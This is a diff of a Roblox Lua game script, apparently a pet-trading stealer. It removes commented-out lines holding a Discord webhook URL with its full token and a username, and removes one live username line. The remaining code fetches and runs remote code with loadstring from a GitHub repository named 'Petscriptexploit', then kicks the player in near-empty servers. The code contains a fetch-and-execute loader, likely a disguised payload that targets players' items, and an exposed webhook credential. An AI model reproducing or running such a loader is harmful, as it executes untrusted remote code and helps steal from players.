@@ -792,16 +792,7 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
---local ajgbsjw = ""
---local kebtbak = ""
---webHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
---local kwbabsi = "X4"
---local iwnrbtk = "_"
---local pqjrbwi = "ND"
---local pbehaid = "Yq"
---userName = "x4_ndyalt"
 loaadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/s2/refs/heads/main/gui%20loader"))()
-userName = "X4_NDYalt lolol"
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
